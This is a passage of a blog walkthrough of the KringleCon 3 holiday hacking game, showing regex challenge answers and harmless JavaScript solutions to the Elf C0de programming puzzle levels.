    <figcaption style="text-align: center;">
      
      regexes
      
        
        
      
    </figcaption>
  
</figure>
<p>The solutions are:</p>
<table>
<thead>
<tr>
<th>Description</th>
<th>Regex</th>
</tr>
</thead>
<tbody>
<tr>
<td>Matches at least one digit</td>
<td><code>[0-9]</code> or <code>\d</code></td>
</tr>
<tr>
<td>Matches 3 alpha a-z characters ignoring case</td>
<td><code>[a-zA-Z]{3}</code></td>
</tr>
<tr>
<td>Matches 2 chars of lowercase a-z or numbers</td>
<td><code>[a-z\d]{2}</code></td>
</tr>
<tr>
<td>Matches any 2 chars not uppercase A-L or 1-5</td>
<td><code> [^A-L1-5]{2}</code></td>
</tr>
<tr>
<td>Matches three or more digits only</td>
<td><code>^\d{3,}$</code></td>
</tr>
<tr>
<td>Matches multiple hour:minute:second time formats only</td>
<td><code>^([0-5]\d):([0-5]\d):([0-5]\d)$</code></td>
</tr>
<tr>
<td>Matches MAC address format only while ignoring case</td>
<td><code>^([\dA-Fa-f]{2}:){5}([\dA-Fa-f]{2})$</code></td>
</tr>
<tr>
<td>Matches multiple day, month, and year date formats only</td>
<td><code>^[0–3]\d[-./][0–1]\d[-./]\d{4}$</code></td>
</tr>
</tbody>
</table>
<p>We passed the challenge and now all presents are sorted correctly:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game03_04.webp" alt="Sort-O-Matic fixed" data-caption="Sort-O-Matic fixed" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Sort-O-Matic fixed
      
        
        
      
    </figcaption>
  
</figure>
<p>Minty gives us some hints to complete <a href="#6---splunk-challenge">Objective 6</a>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Minty Candycane:</strong><br />
Great job! You make this look easy!</p>
<p>Hey, have you tried the <em>Splunk</em> challenge? Are you newer to <em>SOC</em> operations? Maybe check out his <a href="https://www.youtube.com/watch?v=qbIhHhRKQCw">intro talk</a> from last year. <strong>Dave Herrald</strong> is doing a <a href="https://www.youtube.com/watch?v=RxVgEFt08kU">great talk</a> on tracking adversary emulation through <em>Splunk</em>! Don&rsquo;t forget about useful tools including <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a> for decoding and decrypting data!</p>
<p>It&rsquo;s down in the <em>Great Room</em>, but oh, they probably won&rsquo;t let an attendee operate it.</p>
</div>
<div class="notices success" data-title="Objective 6 hints">
  <ul>
<li>Adversary Emulation and Splunk - Dave Herrald talks about emulating advanced adversaries and <a href="https://www.youtube.com/watch?v=RxVgEFt08kU">hunting them with Splunk</a>.</li>
<li>Data Decoding and Investigation - Defenders often need to manipulate data to decRypt, deCode, and reform it into something that is useful. <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a> is extremely useful here!</li>
</ul>

</div>
<h3 id="the-elf-c0de">The Elf C0de</h3>
<hr />
<div class="box">[ELF] <strong>Ribb Bonbowford</strong> [LOCATION] <em>Dining Room</em></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game02_01.webp" alt="The Elf C0de location" data-caption="The Elf C0de location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      The Elf C0de location
      
        
        
      
    </figcaption>
  
</figure>
<p>A fun game awaits us in the <em>Dining Room</em>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Ribb Bonbowford:</strong><br />
Hello - my name is <strong>Ribb Bonbowford</strong>. Nice to meet you!</p>
<p>Are you new to programming? It&rsquo;s a handy skill for anyone in cyber security. This challenge centers around <em>JavaScript</em>. Take a look at this intro and see how far it gets you!</p>
<p>Ready to move beyond <code>elf</code> commands? Don&rsquo;t be afraid to mix in native <em>JavaScript</em>. Trying to extract only numbers from an array? Have you tried to <code>filter</code>? Maybe you need to enumerate an object&rsquo;s keys and then filter? Getting hung up on number of lines? Maybe try to minify your code.</p>
<p>Is there a way to <code>push</code> array items to the beginning of an array? Hmm&hellip;</p>
</div>
<p>The following hints are given by the elf:</p>
<div class="notices success" data-title="The Elf C0de hints">
  <ul>
<li>JavaScript Primer - Want to learn a useful language? <a href="https://jgthms.com/javascript-in-14-minutes/">JavaScript</a> is a great place to start! You can also test out your code using a <a href="https://playcode.io/">JavaScript playground</a>.</li>
<li>JavaScript Loops - Did you try the JavaScript primer? There&rsquo;s a great section on looping.</li>
<li>Filtering Items - <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/filter">There&rsquo;s got to be a way to filter for specific typeof items in an array</a>. Maybe <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/typeof">the typeof operator</a> could also be useful?</li>
<li>Getting a Key Name - <a href="https://stackoverflow.com/questions/9907419/how-to-get-a-key-in-a-javascript-object-by-its-value">In JavaScript you can enumerate an object&rsquo;s keys using keys, and filter the array using filter</a>.</li>
<li>Compressing JS - There are lots of ways to <a href="https://jscompress.com/">make your code shorter</a>, but the number of elf commands is key.</li>
<li>Adding to Arrays - <code>var array = [2, 3, 4]; array.push(1)</code> doesn&rsquo;t do QUITE what was intended&hellip;</li>
</ul>

</div>
<p>This challenge is a <em>Javascript</em> primer and can be as well accessed through <a href="https://elfcode.kringlecastle.com">https://elfcode.kringlecastle.com</a>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game02_02.webp" alt="The Elf C0de - landing page" data-caption="The Elf C0de - landing page" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      The Elf C0de - landing page
      
        
        
      
    </figcaption>
  
</figure>
<p>There are many levels and the goal of each level is always to program our elf to grab all the lollipops and reach the castle entrance by avoiding all the dangers on the map. The <em>Object Help</em> menu on the left as well as the <em>How To Play The Elf C0de</em> are good places to start.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Level 1: Program the elf to the end goal in no more than 2 lines of code and no more than 2 elf commands.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game02_03.webp" alt="level 1 map" data-caption="level 1 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      level 1 map
      
        
        
      
    </figcaption>
  
</figure>
<p>It starts easy and we have 2 different solutions to move the elf:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>or</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lollipop</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 2: Program the elf to the end goal in no more than 5 lines of code and no more than 5 elf command/function execution statements in your code.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game02_04.webp" alt="level 2 map" data-caption="level 2 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      level 2 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The lever <code>#0</code> objective is to add <code>2</code> to the returned numeric value of running the function <code>elf.get_lever(0)</code>. We can submit the solution using <code>elf.pull_lever(answer)</code> while standing on the lever grid square. The solution is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lever</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="kd">var</span> <span class="nx">sum</span> <span class="o">=</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">get_lever</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">pull_lever</span><span class="p">(</span><span class="nx">sum</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>       <span class="c1">// elf.moveTo(lollipop[0]) does not work here
</span><span class="c1"></span><span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 3: Program the elf to the end goal in no more than 4 lines of code and no more than 4 elf command/function execution statements in your code.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game02_05.webp" alt="level 3 map" data-caption="level 3 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      level 3 map
      
        
        
      
    </figcaption>
  
</figure>
<p>We can think of 2 different solutions here as well, one of them introducing loops:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lollipop</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lollipop</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lollipop</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>or</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
 <span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lollipop</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span>
<span class="p">}</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 4: Program the elf to the end goal in no more than 7 lines of code and no more than 6 elf command/function execution statements in your code.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game02_06.webp" alt="level 4 map" data-caption="level 4 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      level 4 map
      
        
        
      
    </figcaption>
  
</figure>
<p>Here, we can loop 5 times, by alternating up and down directions, to guide the elf through the labyrinth:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">5</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
  <span class="nx">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="o">:</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">moveDown</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 5: Program the elf to the end goal in no more than 10 lines of code and no more than 5 elf command/function execution statements in your code..</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game02_07.webp" alt="level 5 map" data-caption="level 5 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      level 5 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The munchkin <code>#0</code> objective is to use <code>elf.ask_munch(0)</code> to get an array of numbers and strings and to return the array with only the number with <code>elf.tell_munch(answer)</code>.</p>
<p>Solution:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">ask_munch</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nx">arr</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">e</span> <span class="p">=&gt;</span> <span class="k">typeof</span> <span class="nx">e</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lollipop</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>    <span class="c1">// will retrieve both lollipops!
</span><span class="c1"></span><span class="nx">elf</span><span class="p">.</span><span class="nx">tell_munch</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 6: Program the elf to the end goal in no more than 15 lines of code and no more than 7 elf command/function execution statements in your code.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game02_08.webp" alt="level 6 map" data-caption="level 6 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      level 6 map
      
        
        
      
    </figcaption>
  
</figure>
<p>There are 2 possible paths here. The first one involves pulling the lever to make the <em>Munchkin</em> fall. The other one involves answering the <em>Munchkin</em> question to let us pass. For both solutions, we can easily get out of the labyrinth by only using <code>elf.moveTo(object)</code> calls.</p>
<p>The lever <code>#0</code> objective is to get an array and add the string <code>munchkin rule</code> as the first element. </p>
<p>The munchkin <code>#0</code> objective is to get a <em>JSON</em> object and we must return the key with a value of <code>lollipop</code>.</p>
<p>Solution 1 (with lever):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lollipop</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span>
<span class="p">}</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lever</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">get_lever</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nx">arr</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="s2">&#34;munchkins rule&#34;</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">pull_lever</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveDown</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Solution 2 (with <em>Munchkin</em>):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">json</span> <span class="o">=</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">ask_munch</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="kd">var</span> <span class="nx">answer</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">json</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">key</span> <span class="p">=&gt;</span> <span class="nx">json</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;lollipop&#34;</span><span class="p">)</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveTo</span><span class="p">(</span><span class="nx">lollipop</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span>
<span class="p">}</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">tell_munch</span><span class="p">(</span><span class="nx">answer</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>We have passed the main levels and <strong>Ribb</strong> rewards us with a hint for <a href="#10---defeat-fingerprint-sensor">Objective 10</a>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Ribb Bonbowford:</strong><br />
Wow - are you a <em>JavaScript</em> developer? Great work!<br />
Hey, you know, you might use your <em>JavaScript</em> and <em>HTTP</em> manipulation skills to take a crack at bypassing the <em>Santavator&rsquo;s S4</em>.</div>
<div class="notices success" data-title="Objective 10 hints">
  <ul>
<li>There may be a way to bypass the Santavator S4 game with the browser console&hellip;</li>
</ul>

</div>
<p>There are still some bonus levels to complete though!!</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Level 7: Program the elf to the end goal in no more than 25 lines of code and no more than 10 elf command/function execution statements in your code.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game02_09.webp" alt="level 7 map" data-caption="level 7 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      level 7 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The levers' objectives are all the same, we need to respond with the lever number and that&rsquo;s it. Each lever will lift the next bridge.<br />
The <em>Munchkin</em> <code>#0</code> objective is:</p>
<figure >
  
  
  
